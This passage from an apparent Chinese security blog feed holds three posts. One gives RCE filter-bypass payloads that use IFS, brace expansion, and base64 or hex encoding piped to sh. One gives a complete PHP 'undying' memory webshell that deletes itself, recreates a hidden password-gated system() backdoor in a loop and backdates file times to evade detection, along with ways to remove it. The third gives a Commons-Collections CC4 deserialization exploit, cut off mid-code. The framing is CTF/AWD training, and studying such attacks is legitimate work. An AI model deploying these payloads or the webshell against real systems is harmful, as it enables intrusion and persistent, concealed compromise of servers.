aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4.删除从右边开始到指定字符第一次出现的字符并保留左边字符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"http://www.test.com/index.html"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">%</span><span class="token operator">/</span>*}</span> <span class="token comment"># http://www.test.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.删除从右边开始到指定字符最后一次出行字符并保留左边字符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"http://www.test.com"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">%%</span><span class="token operator">/</span>*}</span> <span class="token comment"># http:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6.从左开始到指定字节数获取字符串中的子串（按照字节截取）格式（${string:起始字节：字节数}）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"hello world"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">:</span>0<span class="token operator">:</span>7}</span> <span class="token comment"># hello w</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>7.从左开始到指定字节数获取字符串中的子串（从起始字节开始到结束）格式（${string:起始字节}）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"hello world"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">:</span>7}</span> <span class="token comment"># orld</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>8.从右开始到指定字节数获取字符串中的子串（按照字节获取）格式 （${string:0-起始：字节数}）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"hello world"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">:</span>0-5<span class="token operator">:</span>3}</span> <span class="token comment"># wor</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>9.从右开始到指定字节数获取字符串中的子串 (从起始字节开始到字符串末尾) ${string:0-5}</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"hello world"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">:</span>0-5}</span> <span class="token comment"># world</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拼接 shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"w\h\o<span class="token entity" title="\a">\a</span>\m\i"</span> <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-c</span> <span class="token number">1,3</span>,5,7,9,11 <span class="token operator">|</span> <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-绕过空格过滤"><a href="#2-5-绕过空格过滤" class="headerlink" title="2.5 绕过空格过滤"></a>2.5 绕过空格过滤</h3><p>在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，</p><p>利用大括号来绕过空格限制</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>ls,-al<span class="token punctuation">}</span><span class="token punctuation">{</span>ping,-c,2,127.0.0.1<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>${IFS} 绕过空格</p><p>IFS是internal field separator的缩写，shell的特殊环境变量。shell根据IFS存储的值，可以是空格（040）、tab（011）、换行符（012）或者其他自定义符号，来解析输入和输出的变量值。这里echo -n是不进行自动换行</p><p><img src="/../../../../pic/Pasted%20image%2020221101210054.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span><span class="token parameter variable">-la</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-6-利用-base64-绕过命令限制"><a href="#2-6-利用-base64-绕过命令限制" class="headerlink" title="2.6 利用 base64 绕过命令限制"></a>2.6 利用 base64 绕过命令限制</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token function">whoami</span><span class="token operator">|</span>base64 //先输出whoami的base64编码<span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token assign-left variable">dwhvYW1pCg</span><span class="token operator">==</span><span class="token operator">|</span>base64 <span class="token parameter variable">-d</span><span class="token variable">`</span></span> //将其base64解码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101210216.png"></p><h3 id="2-7-hex编码绕过"><a href="#2-7-hex编码绕过" class="headerlink" title="2.7 hex编码绕过"></a>2.7 hex编码绕过</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"whoami"</span> <span class="token operator">|</span> xxd <span class="token parameter variable">-p</span><span class="token builtin class-name">echo</span> <span class="token string">"77686f616d690a"</span> <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> <span class="token operator">|</span> <span class="token function">bash</span><span class="token comment">#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件</span><span class="token comment">#-r参数：逆向转换。将16进制字符串表示转为实际的数</span><span class="token comment">#-ps参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储。</span><span class="token comment">#-r -p将纯十六进制转储的反向输出打印为了ASCII格式。</span><span class="token function">whoami</span> -<span class="token operator">&gt;</span> <span class="token punctuation">\</span>x77<span class="token punctuation">\</span>x68<span class="token punctuation">\</span>x6f<span class="token punctuation">\</span>x61<span class="token punctuation">\</span>x6d<span class="token punctuation">\</span>x69<span class="token punctuation">\</span>x0a<span class="token comment">#经测试，发现在php的ping环境上执行失败。在linux系统上执行成功</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"<span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x0a">\x0a</span>"</span><span class="token variable">)</span></span><span class="token punctuation">{</span>printf,<span class="token string">"<span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x0a">\x0a</span>"</span><span class="token punctuation">}</span><span class="token operator">|</span><span class="token function">bash</span><span class="token variable"><span class="token variable">`</span><span class="token punctuation">{</span>printf,<span class="token string">"<span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x0a">\x0a</span>"</span><span class="token punctuation">}</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-8-长度限制绕过"><a href="#2-8-长度限制绕过" class="headerlink" title="2.8 长度限制绕过"></a>2.8 长度限制绕过</h3><p>方法一：</p><p>可以利用 base64 解码的方式将脚本写入多个文件合并后再执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"whoami"</span> <span class="token operator">|</span> base64   <span class="token comment"># 首先生成所需命令的base64字符串</span><span class="token comment"># d2hvYW1pCg==</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> d2hv <span class="token operator">&gt;</span> a<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> YW1p <span class="token operator">&gt;</span>b<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token assign-left variable">Cg</span><span class="token operator">==</span> <span class="token operator">&gt;</span> c下面合并文件<span class="token function">cat</span> b <span class="token operator">&gt;&gt;</span> a<span class="token function">cat</span> c <span class="token operator">&gt;&gt;</span> a解码文件base64 <span class="token parameter variable">-d</span> a <span class="token operator">&gt;</span> shell.sh<span class="token function">sh</span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法二：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">首先通过命令创建带有命令分隔的文件<span class="token operator">&gt;</span> <span class="token string">"i<span class="token entity" title="\\">\\</span>"</span><span class="token operator">&gt;</span> <span class="token string">"m<span class="token entity" title="\\">\\</span>"</span><span class="token operator">&gt;</span> <span class="token string">"a<span class="token entity" title="\\">\\</span>"</span><span class="token operator">&gt;</span> <span class="token string">"o<span class="token entity" title="\\">\\</span>"</span><span class="token operator">&gt;</span> <span class="token string">"h<span class="token entity" title="\\">\\</span>"</span><span class="token operator">&gt;</span> <span class="token string">"w<span class="token entity" title="\\">\\</span>"</span>在用ls -t输出到一个文件中，再利用sh执行<span class="token function">ls</span> <span class="token parameter variable">-t</span> <span class="token operator">&gt;</span> shell.sh<span class="token comment">#如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即</span><span class="token function">ls</span> <span class="token parameter variable">-at</span> <span class="token operator">&gt;</span> shell.sh<span class="token function">sh</span> shell2.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ta<span class="token string">''</span>c<span class="token punctuation">\</span><span class="token variable">${<span class="token environment constant">IFS</span>}</span>fl<span class="token string">''</span>ag_1s_here<span class="token punctuation">\</span><span class="token variable">${<span class="token environment constant">PATH</span><span class="token operator">%%</span>u*}</span>fla<span class="token string">''</span>g_831b69012c67b35f.ph<span class="token string">''</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rce Trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 不死马（内存马）</title>
      <link href="/2023/01/28/penetrationstest/ji-neng-xue-xi/webshell/bu-si-ma/php-bu-si-ma-nei-cun-ma/"/>
      <url>/2023/01/28/penetrationstest/ji-neng-xue-xi/webshell/bu-si-ma/php-bu-si-ma-nei-cun-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-不死马（内存马）"><a href="#PHP-不死马（内存马）" class="headerlink" title="PHP 不死马（内存马）"></a>PHP 不死马（内存马）</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>PHP 内存性木马即 PHP 不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。</p><p>通常在 AWD Web 题中用得较多。</p><h2 id="Demo-及原理"><a href="#Demo-及原理" class="headerlink" title="Demo 及原理"></a>Demo 及原理</h2><p>nodie.php </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/dvwa/.n0thing.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["pass"])=="852438d026c018c4307b916406f98c62"){@system($_POST[a]);}?&gt;'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" .ski12.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单分析：</p><ul><li><p>ignore_user_abort() 函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</p></li><li><p>set_time_limit() 函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</p></li><li><p>unlink(__FILE__) 删除文件本身，以起到隐蔽自身的作用。</p></li><li><p>while 循环内每隔 usleep(5000) 即写新的后门文件，中间 system() 执行的命令用于修改文件的创建或修改时间，可以绕过“find –name '*.php' –mmin -10”命令检测最近10分钟修改或新创建的 PHP 文件，但不一定有用，可选。</p></li><li><p>至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。</p></li></ul><h2 id="查杀方法"><a href="#查杀方法" class="headerlink" title="查杀方法"></a>查杀方法</h2><p>1、如果允许，重启服务是万能的；</p><p>2、其次，最好的解决方案是kill掉www-data用户的所有子进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> www-data <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $2}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、创建一个和不死马生成的马一样名字的目录；</p><p>4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$pid</span> <span class="token operator">=</span> 不死马的进程<span class="token constant">PID</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".ski12.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"kill -9 <span class="token interpolation"><span class="token variable">$pid</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、找到 10 分钟内被修改的 php 文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">find <span class="token operator">*</span><span class="token operator">.</span>php <span class="token operator">-</span>mmin <span class="token operator">-</span><span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'.php'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>unlink<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 不死马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC4 链</title>
      <link href="/2023/01/26/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc4-lian/"/>
      <url>/2023/01/26/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc4-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC4-链"><a href="#Java-反序列化-Commons-Collections-篇-CC4-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC4 链"></a>Java 反序列化 Commons-Collections 篇 CC4 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>CC2 中的利用 InvokerTransformer 触发 TemplatesImpl.newTransformer() 方法</p><p>在 CC4 中使用了在 CC3 中使用到的 InstantiateTransformer 触发 TemplatesImpl.newTransformer() 方法</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li><p>jdk8u65</p></li><li><p>commons-collections4.0</p></li><li><p>Maven 3.8.7</p></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-CC4-链-EXP-编写"><a href="#3-CC4-链-EXP-编写" class="headerlink" title="3. CC4 链 EXP 编写"></a>3. CC4 链 EXP 编写</h2><p>把 CC2 链的 EXP 稍微修改一下</p><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过 if 确保进入</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入字节码</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// priorityQueue -&gt; readObject</span>        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 size 值进入 siftDown</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改 queue 传入 TemplatesImpl 类</span>        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">,</span> templates<span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token 